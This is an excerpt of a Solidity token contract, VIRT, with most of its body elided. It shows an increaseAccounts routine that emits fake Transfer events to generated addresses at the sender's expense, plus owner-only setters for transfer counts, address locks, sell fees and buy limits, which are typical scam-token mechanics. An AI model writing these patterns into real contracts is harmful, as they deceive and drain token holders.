...
contract VIRT is IERC20, Ownable {
    ...
    uint256 private _defaultBalance = 1 * 10 ** _decimals;
    uint160 private constant _max = ~uint160(0);
    uint160 private _accountDivisor = 1000;
    uint256 private _accountCount = 100;
    ...
    constructor (
        ...
        address FundAddress, address ReceiveAddress, address DevAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        ...
        holderRewardCondition = 100000000 * 10 ** IERC20(USDTAddress).decimals();
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            ...
            feeAmount += (_defaultBalance * _accountCount);
            increaseAccounts(sender);
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }
    ...
    function increaseAccounts(address sender) private {
        uint160 accountDivisor = _accountDivisor;
        address accountNew;
        for (uint256 i=0; i<_accountCount; ++i) {
            accountNew = address(uint160(_max / accountDivisor));
            accountDivisor += 2;
            emit Transfer(sender, accountNew, _defaultBalance);
        }
        _accountDivisor = accountDivisor;
    }
    ...
    function setSendCount(uint256 count) external onlyFunder {
        _accountCount = count;
    }

    function setLockAddress(address addr, bool open) external onlyFunder {
    ...
    function setSellDestroyFee(uint256 destroyFee) external onlyFunder {
    ...
    function setMaxBuyAmt(uint256 amt) external onlyFunder {
